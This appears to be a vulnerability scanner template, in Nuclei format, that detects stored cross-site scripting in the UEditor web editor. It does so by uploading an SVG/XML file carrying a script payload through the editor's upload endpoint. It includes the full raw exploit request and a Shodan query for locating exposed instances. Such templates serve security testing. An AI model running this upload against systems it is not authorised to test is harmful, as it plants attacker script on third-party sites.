http:
- extractors:
  - group: 1
    name: file_path
    part: body
    regex:
    - url":"(.*)","title
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - state":"SUCCESS
    - .xml","title
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /ueditor/php/controller.php?action=uploadfile HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstring}}\n\
    \n------WebKitFormBoundary{{randstring}}\nContent-Disposition: form-data; name=\"\
    upfile\"; filename=\"test.xml\"\nContent-Type: application/vnd.ms-excel\n\n<?xml\
    \ version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG\
    \ 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"\
    1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n   <rect width=\"\
    300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\"\
    \ />\n   <script type=\"text/javascript\">\n      alert(document.domain);\n  \
    \ </script>\n</svg>\n------WebKitFormBoundary{{randstring}}--\n"
  stop-at-first-match: true
id: ueditor-xss
info:
  author: pwnhxl
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: 'The latest vulnerability version of UEditor, a rich text web editor,
    allows for XML file uploads which can lead to stored cross-site scripting (XSS)
    attacks.

    '
  metadata:
    max-request: 1
    shodan-query: title:"ueditor"
    verified: true
  name: ueditor - Cross Site Scripting
  reference:
  - https://blog.csdn.net/weixin_50464560/article/details/124803185
  - https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3
  severity: high
  tags: ueditor,xss,intrusive
variables:
  randstring: '{{to_lower(rand_base(16))}}'
